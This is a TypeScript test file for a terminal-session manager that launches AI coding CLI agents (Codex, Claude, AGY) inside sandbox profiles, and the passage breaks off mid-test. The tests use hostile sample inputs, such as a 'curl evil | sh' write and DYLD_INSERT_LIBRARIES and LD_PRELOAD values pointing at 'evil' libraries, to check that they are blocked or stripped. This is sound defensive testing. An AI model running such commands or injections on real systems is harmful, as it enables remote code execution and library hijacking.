import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import Database from "better-sqlite3";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import type { WebContents } from "electron";
import { parse } from "smol-toml";
import { BUILTIN_ADAPTERS } from "../../adapters/builtin";
import { cliPtyAdapterSchema } from "../../shared/adapter-types";
import { PTY_CHANNELS } from "../../shared/channels";
import { CODEX_WORKSPACE_PERMISSION_PROFILE } from "./codex-native-authority";
import {
  PET_STUDIO_SQUAD,
  PET_STUDIO_SQUAD_ID,
} from "../../shared/pet-studio";
import { snapshotSquadAuthority } from "../orch/squad-authority-snapshot";

// Unit tests use a fake PTY host — pin absolute bin paths so spawn never
// depends on the machine PATH (same contract as production discovery).
vi.mock("../path-resolver", () => ({
  resolveSpawnBinary: (command: string, preferred?: string | null) => {
    const binPath =
      preferred && preferred.startsWith("/")
        ? preferred
        : `/mock/bin/${command || "cli"}`;
    return {
      binPath,
      effectivePath: "/mock/bin",
      source: preferred ? "absolute" : "process-path",
    };
  },
  revalidateExecutable: (binPath: string) =>
    typeof binPath === "string" && binPath.startsWith("/"),
  resolveCliBinary: (command: string) => ({
    binPath: `/mock/bin/${command}`,
    effectivePath: "/mock/bin",
    source: "process-path",
  }),
}));

const adapterTrust = vi.hoisted(() => ({
  // Most unit fixtures use `test-cli`; mark the normal fixture ids trusted and
  // toggle Codex explicitly in the origin-forgery assertions below.
  builtinIds: new Set([
    "test-cli",
    "claude",
    "codex",
    "kimi",
    "opencode",
    "agy",
    "grok",
    "glm",
    "longcat",
  ]),
  rejectedBinPath: null as string | null,
}));
const nativeLaunchTrust = vi.hoisted(() => ({
  currentIdentity: "vendor-native-v1",
  swapAfterQualification: false,
  qualificationCount: 0,
  revalidationCount: 0,
}));
const darwinSupervisorTrust = vi.hoisted(() => ({
  readPath: "/usr/bin/true",
  error: null as Error | null,
  resolutionCount: 0,
}));
vi.mock("../adapters/adapter-registry", async (importOriginal) => {
  const original =
    await importOriginal<typeof import("../adapters/adapter-registry")>();
  return {
    ...original,
    isBuiltinAdapter: (id: string) => adapterTrust.builtinIds.has(id),
  };
});
vi.mock("./trusted-native-cli-binary", () => ({
  supportsPinnedNativeConfinementAuthenticity: (adapterId: string) =>
    adapterId === "codex" || adapterId === "claude",
  qualifyTrustedNativeConfinementLaunch: (input: {
    adapterId: string;
    requestedBinPath: string;
  }) => {
    if (input.requestedBinPath === adapterTrust.rejectedBinPath) {
      throw new Error("executable override diverges from canonical discovery");
    }
    if (input.adapterId !== "codex" && input.adapterId !== "claude") {
      throw new Error(
        `adapter ${input.adapterId} has no pinned native confinement authenticity root`,
      );
    }
    nativeLaunchTrust.qualificationCount += 1;
    const launch = Object.freeze({
      executablePath: input.requestedBinPath,
      runtimeReadPaths: Object.freeze([]),
      providerNetworkProcessPaths: Object.freeze(
        input.adapterId === "codex" ? [process.execPath] : [],
      ),
      darwinExecutableSeal: Object.freeze({
        platform: "darwin",
        executablePath: input.requestedBinPath,
        identifier:
          input.adapterId === "claude"
            ? "com.anthropic.claude-code"
            : input.adapterId,
        teamIdentifier:
          input.adapterId === "claude" ? "Q6L2SF6YDW" : "2DC432GLL2",
        cdHash: "c9da028e2080a684d2c355e6f40ffc53c21ff7ee",
        sha256:
          "1da3f4e0e96028b8a771814293c3033dafd1971f943f6c7e79b0897fe705f590",
      }),
      testIdentity: nativeLaunchTrust.currentIdentity,
    });
    if (nativeLaunchTrust.swapAfterQualification) {
      nativeLaunchTrust.currentIdentity = "vendor-native-replaced";
      nativeLaunchTrust.swapAfterQualification = false;
    }
    return launch;
  },
  revalidateTrustedNativeConfinementLaunch: (launch: {
    testIdentity: string;
  }) => {
    nativeLaunchTrust.revalidationCount += 1;
    if (launch.testIdentity !== nativeLaunchTrust.currentIdentity) {
      throw new Error(
        "native confinement installation changed after qualification",
      );
    }
  },
}));
vi.mock("./darwin-pty-supervisor", () => ({
  currentDarwinPtySupervisorRuntime: (moduleDir: string) => ({
    platform: "darwin",
    packaged: false,
    cwd: process.cwd(),
    moduleDir,
  }),
  resolveDarwinPtySupervisor: () => {
    darwinSupervisorTrust.resolutionCount += 1;
    if (darwinSupervisorTrust.error) throw darwinSupervisorTrust.error;
    return darwinSupervisorTrust.readPath;
  },
  resolvePackagedDarwinLaunchAuthorizationReadPaths: () => [],
}));

import {
  __resetPtyShutdownLifecycleForTests,
  agentEnv,
  acknowledgeSessionOutput,
  bindOwnedAgentSessionMission,
  configureAgentHookEndpointPath,
  consumeMissionOrchestratorGrant,
  getAgentSessionInfo,
  getOwnedAgentSessionInfo,
  getSessionState,
  adoptMainOwnedAgentSession,
  killSession,
  killSessionsFor,
  listAgentSessions,
  liveSessionSummary,
  recoverSessionOutput,
  setPtyHost,
  setAgentSpawnHook,
  setResumeSessionLookup,
  setSessionDictationHook,
  setSquadCliPolicyLookupForTests,
  spawnAgentSession,
  spawnMainOwnedAgentSession,
  spawnSession,
  publishSessionActivityState,
  tapSessionTermination,
  terminateAllSessions,
  orchKillSession,
  orchTerminateSession,
  orchWriteSession,
  writeSession,
} from "./pty-manager";
import type {
  PtyHost,
  PtyProcHandle,
  PtySessionHandlers,
  PtySpawnSpec,
} from "./pty-host-core";
import type { CliPtyAdapter } from "../../shared/adapter-types";
import type { BoundSpawnAuthority } from "../orch/spawn-authority";
import {
  bindTokenToSession,
  getContext,
  mintToken,
  resetGateForTests,
} from "../orch/gate";
import { installMcpSessionTerminationRevocation } from "../orch/mcp-session-revocation";
import { cleanupCliMcpSession } from "../orch/cli-mcp-session-config";

beforeEach(() => {
  // Most legacy hardening cases exercise the explicit hardened mode. Tests for
  // the default autopilot opt into operator-choice locally.
  setSquadCliPolicyLookupForTests(() => "governed");
});

afterEach(() => {
  setSquadCliPolicyLookupForTests(null);
});

function trustedSpawn(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  return {
    source: "direct-user",
    context: null,
    cwd,
    scope: {
      version: 1,
      installationId: "installation-test",
      projectId: "project-test",
      checkoutId: "checkout-test",
      rootRealPath: cwd,
      identitySource: "provisional",
    },
  };
}

function missionGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "legacy-squad",
    context: {
      squadId: "review-squad",
      agentName: "Maestro",
      role: "orchestrator",
      allowedTools: ["nexus_pane_spawn"],
      allowedSkills: ["review"],
    },
  };
}

function petStudioGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const maker = PET_STUDIO_SQUAD.agents[0]!;
  return {
    ...base,
    source: "legacy-squad",
    coordinationScope: base.scope,
    context: {
      squadId: PET_STUDIO_SQUAD_ID,
      agentName: maker.agentName,
      role: "orchestrator",
      allowedTools: maker.allowedTools ?? null,
      allowedSkills: maker.allowedSkills ?? null,
      scope: base.scope,
    },
  };
}

function persistedPetStudioGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const maker = PET_STUDIO_SQUAD.agents[0]!;
  const contextRevision = "pet-context-revision";
  return {
    ...base,
    source: "persisted-pane",
    coordinationScope: base.scope,
    context: {
      missionId: "mission-pet",
      squadId: PET_STUDIO_SQUAD_ID,
      agentName: maker.agentName,
      role: "orchestrator",
      allowedTools: maker.allowedTools ?? null,
      allowedSkills: maker.allowedSkills ?? null,
      contextRevision,
      authoritySeal: {
        intentVersion: 1,
        intentContractHash: "a".repeat(64),
        contextRevision,
        contractHash: "b".repeat(64),
        squadRevisionHash: snapshotSquadAuthority(PET_STUDIO_SQUAD).hash,
      },
      scope: base.scope,
      executionScope: base.scope,
    },
  };
}

function revisionBoundWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const coordinationScope = {
    ...base.scope,
    rootRealPath: path.dirname(cwd),
  };
  return {
    ...base,
    source: "pending",
    coordinationScope,
    context: {
      missionId: "mission-worker",
      contextRevision: "context-revision-worker",
      role: "worker",
      workerIncarnationId: "worker-incarnation-main-owned",
      allowedTools: [],
      allowedSkills: null,
      scope: coordinationScope,
      executionScope: base.scope,
    },
  };
}

function preRevisionMissionWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  const coordinationScope = {
    ...base.scope,
    rootRealPath: path.dirname(cwd),
  };
  return {
    ...base,
    source: "pending",
    coordinationScope,
    context: {
      missionId: "mission-worker-before-prevc",
      role: "worker",
      workerIncarnationId: "worker-before-prevc",
      allowedTools: null,
      allowedSkills: null,
      scope: coordinationScope,
      executionScope: base.scope,
    },
  };
}

// Ownership tests exercise the renderer capability boundary, not autonomous
// task execution. Keep them on the explicit legacy/manual path so a generic
// fixture does not accidentally claim the Codex-only worker sandbox.
function legacyManualWorker(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const authority = revisionBoundWorker(cwd);
  return {
    ...authority,
    context: {
      ...authority.context!,
      contextRevision: undefined,
    },
  };
}

function persistedMissionGrant(
  cwd = fs.realpathSync(process.cwd()),
): BoundSpawnAuthority {
  const base = trustedSpawn(cwd);
  return {
    ...base,
    source: "persisted-pane",
    coordinationScope: base.scope,
    context: {
      missionId: "mission-persisted",
      agentName: "Persisted orchestrator",
      role: "orchestrator",
      allowedTools: null,
      allowedSkills: null,
      scope: base.scope,
      executionScope: base.scope,
    },
  };
}

// A minimal, valid cli-pty adapter shaped just enough for agentEnv(). Only the
// `env` block matters here; the rest satisfies the type.
function makeAdapter(
  env: CliPtyAdapter["env"],
  spawnPatch: Partial<CliPtyAdapter["spawn"]> = {},
): CliPtyAdapter {
  return {
    kind: "cli-pty",
    id: "test-cli",
    label: "Test CLI",
    version: "1.0.0",
    icon: "🤖",
    bin: "test-cli",
    detect: "test-cli --version",
    install: { method: "npm", command: "npm install -g test-cli" },
    auth: { method: "none" },
    spawn: {
      interactive: ["test-cli"],
      headless: ["test-cli", "--prompt", "{{PROMPT}}"],
      ptyRequired: true,
      resumeArgs: [],
      extraArgs: [],
      ...spawnPatch,
    },
    env,
    models: { flag: "--model", list: ["default"], default: "default" },
    promptInjection: {
      method: "arg",
      trailingNewline: true,
      bracketedPaste: false,
    },
    stateParsing: {
      idle: { type: "timeout", ms: 500 },
      shellIntegration: false,
      exitCodes: {},
    },
    quirks: {
      altScreen: false,
      requiresNoAutoUpdate: false,
      mcpAutoload: false,
      nexusMcp: "none",
    },
    control: {
      permission: {
        safe: ["--sandbox", "read-only"],
        yolo: [],
        modes: {},
        default: "",
      },
    },
  } as CliPtyAdapter;
}

function builtinCliPtyAdapter(id: string): CliPtyAdapter {
  const raw = BUILTIN_ADAPTERS.find(
    (adapter) => (adapter as { id?: string }).id === id,
  );
  return cliPtyAdapterSchema.parse(raw);
}

function makeCodexAdapter(
  env: CliPtyAdapter["env"] = {
    static: {},
    passthrough: [],
    ephemeralHome: false,
  },
): CliPtyAdapter {
  const builtin = builtinCliPtyAdapter("codex");
  return {
    ...builtin,
    env,
  };
}

function installGovernedCodexTestHook(root: string): () => void {
  const home = path.join(root, "home");
  fs.mkdirSync(home, { recursive: true });
  vi.stubEnv("HOME", home);
  const tokens: string[] = [];
  setAgentSpawnHook((_adapter, _request, authority) => {
    const meta = authority.context;
    const ctx = mintToken({
      label: "governed-codex-test",
      role: meta?.role ?? "user",
      missionId: meta?.missionId,
      contextRevision: meta?.contextRevision,
      workerIncarnationId: meta?.workerIncarnationId,
      scope: authority.coordinationScope ?? authority.scope,
      executionScope: authority.scope,
      allowedTools: meta?.allowedTools ?? null,
      allowedSkills: meta?.allowedSkills ?? null,
    });
    tokens.push(ctx.token);
    return {
      env: { NEXUS_MCP_TOKEN: ctx.token },
      extraArgs: [],
    };
  });
  return () => {
    for (const token of tokens) cleanupCliMcpSession(token);
    setAgentSpawnHook(null);
    resetGateForTests();
    vi.unstubAllEnvs();
  };
}

function seedCodexResumeState(root: string, sessionId: string): void {
  const codexHome = path.join(root, "home", ".codex");
  const rollout = path.join(
    codexHome,
    "sessions",
    "2026",
    "07",
    "26",
    `rollout-${sessionId}.jsonl`,
  );
  fs.mkdirSync(path.dirname(rollout), { recursive: true });
  fs.writeFileSync(path.join(codexHome, "auth.json"), "{}");
  fs.writeFileSync(rollout, '{"type":"session_meta"}\n');
  const db = new Database(path.join(codexHome, "state_5.sqlite"));
  try {
    db.exec(`
      CREATE TABLE backfill_state (
        id INTEGER PRIMARY KEY,
        status TEXT NOT NULL
      );
      CREATE TABLE threads (
        id TEXT PRIMARY KEY,
        rollout_path TEXT NOT NULL
      );
      INSERT INTO backfill_state (id, status) VALUES (1, 'complete');
    `);
    db.prepare(
      "INSERT INTO threads (id, rollout_path) VALUES (?, ?)",
    ).run(sessionId, rollout);
  } finally {
    db.close();
  }
}

function governedCodexPermissionProfile(spec: PtySpawnSpec): string | undefined {
  const codexHome = spec.env.CODEX_HOME;
  if (!codexHome) return undefined;
  const config = parse(
    fs.readFileSync(path.join(codexHome, "config.toml"), "utf8"),
  ) as { default_permissions?: string };
  return config.default_permissions;
}

function governedCodexArgv(spec: PtySpawnSpec): string[] {
  const executableIndex = spec.args.indexOf("/mock/bin/codex");
  return executableIndex >= 0
    ? spec.args.slice(executableIndex + 1)
    : spec.args;
}

function expectDarwinCodexOuterSandbox(spec: PtySpawnSpec): void {
  expect(spec.file).toBe("/usr/bin/sandbox-exec");
  expect(spec.args[0]).toBe("-p");
  expect(spec.args[1]).toContain("(deny file-write*)");
  expect(spec.args[1]).toContain("(deny network*)");
  expect(spec.args[1]).toContain("(with-filter (process-path ");
  expect(spec.args[1]).toContain('(literal "/usr/bin/true")');
  expect(
    spec.args[1].match(/\(with-filter \(process-path /gu),
  ).toHaveLength(1);
  expect(spec.args).toContain("/mock/bin/codex");
  expect(spec.darwinExecutableSeal).toMatchObject({
    platform: "darwin",
    executablePath: "/mock/bin/codex",
    identifier: "codex",
    teamIdentifier: "2DC432GLL2",
  });
  expect(governedCodexArgv(spec)).toEqual(
    expect.arrayContaining([
      "--sandbox",
      "danger-full-access",
      "--ask-for-approval",
      "on-request",
    ]),
  );
  expect(governedCodexArgv(spec)).not.toContain(
    "--dangerously-bypass-approvals-and-sandbox",
  );
}

function expectHookLoopbackGrant(
  spec: PtySpawnSpec,
  port: number,
): void {
  expect(spec.args[1]).toContain(
    `(with-filter (process-path "/usr/bin/curl") ` +
      `(allow network-outbound (remote tcp "localhost:${port}")))`,
  );
}

describe("agentEnv linker-injection guard (plugin trust boundary)", () => {
  it("drops DYLD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { DYLD_INSERT_LIBRARIES: "/tmp/evil.dylib", SAFE_VAR: "ok" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.DYLD_INSERT_LIBRARIES).toBeUndefined();
    expect(env.SAFE_VAR).toBe("ok");
  });

  it("drops LD_ keys from env.static", () => {
    const env = agentEnv(
      makeAdapter({
        static: { LD_PRELOAD: "/tmp/evil.so", LD_LIBRARY_PATH: "/tmp" },
        passthrough: [],
        ephemeralHome: false,
      }),
    );
    expect(env.LD_PRELOAD).toBeUndefined();
    expect(env.LD_LIBRARY_PATH).toBeUndefined();
  });

  it("drops DYLD_/LD_ keys from env.passthrough even if present in process.env", () => {
    process.env.DYLD_TEST_INJECT = "x";
    process.env.LD_TEST_INJECT = "y";
    try {
      const env = agentEnv(
        makeAdapter({
          static: {},
          passthrough: ["DYLD_TEST_INJECT", "LD_TEST_INJECT"],
          ephemeralHome: false,
        }),
      );
      expect(env.DYLD_TEST_INJECT).toBeUndefined();
      expect(env.LD_TEST_INJECT).toBeUndefined();
    } finally {
      delete process.env.DYLD_TEST_INJECT;
      delete process.env.LD_TEST_INJECT;
    }
  });

  it("keeps ordinary static and passthrough vars", () => {
    process.env.NEXUS_TEST_TOKEN = "secret";
    try {
      const env = agentEnv(
        makeAdapter({
          static: { FOO: "bar" },
          passthrough: ["NEXUS_TEST_TOKEN"],
          ephemeralHome: false,
        }),
      );
      expect(env.FOO).toBe("bar");
      expect(env.NEXUS_TEST_TOKEN).toBe("secret");
    } finally {
      delete process.env.NEXUS_TEST_TOKEN;
    }
  });
});

// A WebContents stub that always accepts sends (canSend passes).
function fakeWc(): WebContents {
  return {
    isDestroyed: () => false,
    isCrashed: () => false,
    send: () => {},
  } as unknown as WebContents;
}

// Records the per-session proxy so a test can see which control calls fired.
function fakeHost(): {
  host: PtyHost;
  procFor: (id: string) => PtyProcHandle;
  specFor: (id: string) => PtySpawnSpec;
} {
  const procs = new Map<string, PtyProcHandle>();
  const specs = new Map<string, PtySpawnSpec>();
  return {
    host: {
      spawn(spec, handlers) {
        let exited = false;
        const proc: PtyProcHandle = {
          write: vi.fn(),
          resize: vi.fn(),
          kill: vi.fn(),
          terminate: vi.fn(async () => {
            if (!exited) {
              exited = true;
              handlers.onExit(0, 15);
            }
            return {
              ok: true,
              rootExited: true,
              descendantsExited: true,
            };
          }),
        };
        specs.set(spec.sessionId, spec);
        procs.set(spec.sessionId, proc);
        return proc;
      },
    },
    procFor: (id) => procs.get(id)!,
    specFor: (id) => specs.get(id)!,
  };
}

describe("PTY session ownership (renderer capability boundary)", () => {
  it("keeps a detached mission agent in the app-shutdown physical inventory", async () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const authority = legacyManualWorker();
    const { sessionId } = spawnMainOwnedAgentSession(
      {
        kind: "cli-agent",
        cols: 120,
        rows: 36,
        paneId: "pane-main-owned",
        adapterId: "test-cli",
      },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    const proc = h.procFor(sessionId);
    const owner = fakeWc();
    expect(liveSessionSummary()).toEqual({ total: 1, busy: 1 });
    expect(liveSessionSummary(owner)).toEqual({ total: 0, busy: 0 });
    const exactClaim = {
      paneId: "pane-main-owned",
      adapterId: "test-cli",
      missionId: "mission-worker",
      role: "worker" as const,
      workerIncarnationId: "worker-incarnation-main-owned",
      model: undefined,
      accountId: undefined,
      effort: undefined,
      cwd: authority.cwd,
      agentName: undefined,
      readOnly: false,
      nativeReadOnly: true,
      allowedTools: [] as string[],
      allowedSkills: null,
      authoritySeal: undefined,
      scope: authority.scope,
    };

    expect(adoptMainOwnedAgentSession(owner, exactClaim)).toEqual({
      sessionId,
      state: "spawning",
    });
    expect(writeSession(owner, sessionId, "continue\r")).toBe(false);
    expect(getOwnedAgentSessionInfo(owner, sessionId)).toMatchObject({
      workerIncarnationId: "worker-incarnation-main-owned",
    });
    expect(proc.write).not.toHaveBeenCalled();
    killSession(owner, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(orchWriteSession(sessionId, "main-before-detach\r")).toBe(true);
    expect(proc.write).toHaveBeenCalledWith("main-before-detach\r");

    // Closing/crashing a renderer must detach an orchestrated mission process,
    // not kill the worker that the main coordinator still owns.
    killSessionsFor(owner);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(writeSession(owner, sessionId, "forged\r")).toBe(false);
    expect(orchWriteSession(sessionId, "main\r")).toBe(true);
    expect(publishSessionActivityState(sessionId, "busy")).toBe(true);

    const replacement = fakeWc();
    expect(
      adoptMainOwnedAgentSession(replacement, {
        ...exactClaim,
        readOnly: true,
      }),
    ).toBeNull();
    expect(adoptMainOwnedAgentSession(replacement, exactClaim)).toEqual({
      sessionId,
      state: "busy",
    });
    killSession(replacement, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    killSessionsFor(replacement);
    const shutdown = terminateAllSessions();
    await expect(shutdown).resolves.toEqual({
      ok: true,
      attemptedSessionIds: [sessionId],
      terminatedSessionIds: [sessionId],
      failedSessionIds: [],
    });
    expect(proc.terminate).toHaveBeenCalledOnce();
    __resetPtyShutdownLifecycleForTests();
  });

  it("reattaches an owned mission session to the same renderer after a page reload", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const authority = legacyManualWorker();
    const { sessionId } = spawnMainOwnedAgentSession(
      {
        kind: "cli-agent",
        cols: 120,
        rows: 36,
        paneId: "pane-reattach",
        adapterId: "test-cli",
      },
      makeAdapter({ static: {}, passthrough: [], ephemeralHome: false }),
      {},
      authority,
    );
    const owner = fakeWc();
    const claim = {
      paneId: "pane-reattach",
      adapterId: "test-cli",
      missionId: "mission-worker",
      role: "worker" as const,
      workerIncarnationId: "worker-incarnation-main-owned",
      model: undefined,
      accountId: undefined,
      effort: undefined,
      cwd: authority.cwd,
      agentName: undefined,
      readOnly: false,
      nativeReadOnly: true,
      allowedTools: [] as string[],
      allowedSkills: null,
      authoritySeal: undefined,
      scope: authority.scope,
    };
    expect(adoptMainOwnedAgentSession(owner, claim)).toEqual({
      sessionId,
      state: "spawning",
    });

    // A page reload keeps the same WebContents but wipes the renderer's
    // session map; re-adoption by the SAME owner must reattach, not null out
    // into the physical-exit fence.
    expect(adoptMainOwnedAgentSession(owner, claim)).toEqual({
      sessionId,
      state: "spawning",
    });

    // A different renderer still cannot take a session owned by another wc.
    expect(adoptMainOwnedAgentSession(fakeWc(), claim)).toBeNull();
  });

  it("sequences output and recovers missed push chunks through the owner-only pull lane", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const attacker = fakeWc();
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    (handlers as PtySessionHandlers | null)?.onData("one");
    (handlers as PtySessionHandlers | null)?.onData("two");
    expect(send).toHaveBeenNthCalledWith(1, "pty:data", {
      sessionId,
      data: "one",
      sequence: 1,
    });
    expect(recoverSessionOutput(owner, sessionId, 0)).toHaveLength(2);
    acknowledgeSessionOutput(owner, sessionId, 1);
    expect(recoverSessionOutput(owner, sessionId, 1)).toEqual([
      { sessionId, data: "two", sequence: 2 },
    ]);
    expect(recoverSessionOutput(attacker, sessionId, 0)).toEqual([]);
    orchKillSession(sessionId);
  });

  it("pauses output push over the backpressure budget and resumes after acks", () => {
    let handlers: PtySessionHandlers | null = null;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(async () => ({
        ok: false,
        rootExited: false,
        descendantsExited: false,
      })),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
    try {
      const h = handlers as PtySessionHandlers | null;
      const big = "x".repeat(200 * 1024);
      const dataSends = () =>
        send.mock.calls.filter(([channel]) => channel === PTY_CHANNELS.data);

      h?.onData(big); // seq 1 — 200K unacked: sent
      h?.onData(big); // seq 2 — 400K unacked: sent
      h?.onData(big); // seq 3 — 600K over the 512K budget: push paused
      h?.onData(big); // seq 4 — still paused
      expect(dataSends()).toHaveLength(2);

      // Paused chunks still land in the replay window and stay pullable.
      expect(
        recoverSessionOutput(owner, sessionId, 2).map((e) => e.sequence),
      ).toEqual([3, 4]);

      // One throttled warning despite repeated trips.
      expect(
        warn.mock.calls.filter(([message]) =>
          String(message).includes("backpressure"),
        ),
      ).toHaveLength(1);

      // Acks drain the replay window → the push resumes.
      acknowledgeSessionOutput(owner, sessionId, 4);
      h?.onData("tail");
      expect(dataSends()).toHaveLength(3);
      expect(dataSends().at(-1)?.[1]).toEqual({
        sessionId,
        data: "tail",
        sequence: 5,
      });
    } finally {
      warn.mockRestore();
      orchKillSession(sessionId);
    }
  });

  it("only the owning WebContents can write to / kill a session", async () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const owner = fakeWc();
    const attacker = fakeWc();

    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const proc = h.procFor(sessionId);

    // A different renderer (or a session id it guessed) is refused: no bytes reach the PTY.
    writeSession(attacker, sessionId, "curl evil | sh\n");
    expect(proc.write).not.toHaveBeenCalled();

    // The owner writes normally.
    writeSession(owner, sessionId, "ls\n");
    expect(proc.write).toHaveBeenCalledWith("ls\n");

    // A foreign kill is a no-op; the session stays live.
    killSession(attacker, sessionId);
    expect(proc.kill).not.toHaveBeenCalled();
    expect(getSessionState(sessionId)).not.toBeNull();

    // The owner kills it.
    killSession(owner, sessionId);
    expect(proc.terminate).toHaveBeenCalledTimes(1);
    await orchTerminateSession(sessionId);
    expect(getSessionState(sessionId)).toBeNull();
  });

  it("spawns the operator shell as a login shell (-l) so the account PATH loads", () => {
    const h = fakeHost();
    setPtyHost(h.host);
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      fakeWc(),
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );

    // Sem -l o zsh não lê .zprofile/.zlogin: homebrew e ~/.local/bin somem do
    // PATH do pane — fricção direta no vibecode (foi o bash-3.2 pelado de campo).
    expect(h.specFor(sessionId).args[0]).toBe("-l");
    orchKillSession(sessionId);
  });

  it("does not authorize replacement until the PTY host proves physical exit", async () => {
    let handlers: PtySessionHandlers | null = null;
    let resolveProof!: (proof: {
      ok: true;
      rootExited: true;
      descendantsExited: true;
    }) => void;
    const proc: PtyProcHandle = {
      write: vi.fn(),
      resize: vi.fn(),
      kill: vi.fn(),
      terminate: vi.fn(
        () =>
          new Promise<{
            ok: true;
            rootExited: true;
            descendantsExited: true;
          }>((resolve) => {
            resolveProof = resolve;
          }),
      ),
    };
    setPtyHost({
      spawn(_spec, nextHandlers) {
        handlers = nextHandlers;
        return proc;
      },
    });
    const send = vi.fn();
    const owner = {
      isDestroyed: () => false,
      isCrashed: () => false,
      send,
    } as unknown as WebContents;
    const trusted = trustedSpawn();
    const { sessionId } = spawnSession(
      owner,
      { kind: "shell", cols: 80, rows: 24 },
      { scope: trusted.scope, cwd: trusted.cwd, shell: "/bin/zsh" },
    );
    const replacement = vi.fn();
    const termination = orchTerminateSession(sessionId, {
      termTimeoutMs: 10_000,
      killTimeoutMs: 10_000,
    });
    void termination.then((exited) => {
      if (exited) replacement();
    });

    expect(proc.terminate).toHaveBeenCalledWith({
      termTimeoutMs: 10_000,
      killTimeoutMs: 10_000,
    });
    expect(getSessionState(sessionId)).not.toBeNull();
    expect(orchWriteSession(sessionId, "late command\r")).toBe(false);
    (handlers as PtySessionHandlers | null)?.onData("late output");
    await Promise.resolve();
    expect(replacement).not.toHaveBeenCalled();
    expect(
      send.mock.calls.some(([channel]) => channel === PTY_CHANNELS.data),
    ).toBe(false);

    (handlers as PtySessionHandlers | null)?.onExit(0, 15);
    resolveProof({
      ok: true,
      rootExited: true,
      descendantsExited: true,
    });
    await expect(termination).resolves.toBe(true);
    expect(getSessionState(sessionId)).toBeNull();
    expect(replacement).toHaveBeenCalledOnce();
  });
});

describe("AGY advisory native profile", () => {
  const macosIt = process.platform === "darwin" ? it : it.skip;

  macosIt(
    "keeps the OS account HOME when Electron HOME is isolated and grants only AGY state",
    async () => {
      const root = fs.mkdtempSync(
        path.join(os.tmpdir(), "nexus-agy-native-profile-"),
      );
      const worktree = path.join(root, "project", "worktree");
      const nativeHome = path.join(root, "native-home");
      const isolatedElectronHome = path.join(root, "electron-home");
      const geminiHome = path.join(nativeHome, ".gemini");
      const agyState = path.join(geminiHome, "antigravity-cli");
      const keychains = path.join(nativeHome, "Library", "Keychains");
      const nativeMcpConfig = path.join(agyState, "mcp_config.json");
      const binary = path.join(root, "bin", "agy");
      fs.mkdirSync(worktree, { recursive: true });
      fs.mkdirSync(isolatedElectronHome, { recursive: true });
      fs.mkdirSync(agyState, { recursive: true });
      fs.mkdirSync(keychains, { recursive: true });
      fs.mkdirSync(path.dirname(binary), { recursive: true });
      fs.writeFileSync(binary, "#!/bin/sh\n");
      fs.chmodSync(binary, 0o755);
      fs.writeFileSync(
        nativeMcpConfig,
        '{"mcpServers":{"existing":{"command":"leave-me-alone"}}}\n',
      );
      const originalMcpConfig = fs.readFileSync(nativeMcpConfig);
      const nativeUser = os.userInfo();
      const userInfoSpy = vi.spyOn(os, "userInfo").mockReturnValue({
        ...nativeUser,
        homedir: nativeHome,
      });
      vi.stubEnv("HOME", isolatedElectronHome);
      setAgentSpawnHook(null);
      const host = fakeHost();
      setPtyHost(host.host);
      const baseAuthority = revisionBoundWorker(
        fs.realpathSync.native(worktree),
      );
      const authority: BoundSpawnAuthority = {
        ...baseAuthority,
        context: {
          ...baseAuthority.context!,
          readOnly: true,
          nativeReadOnly: false,
        },
      };
      let sessionId: string | null = null;

      try {
        ({ sessionId } = spawnMainOwnedAgentSession(
          {
            kind: "cli-agent",
            paneId: "agy-native-profile",
            cols: 100,
            rows: 30,
          },
          builtinCliPtyAdapter("agy"),
          { binPath: binary },
          authority,
        ));

        const spec = host.specFor(sessionId);
        const profile = spec.args[1] ?? "";
        const writeSection = profile.slice(
          profile.indexOf("(allow file-write*"),
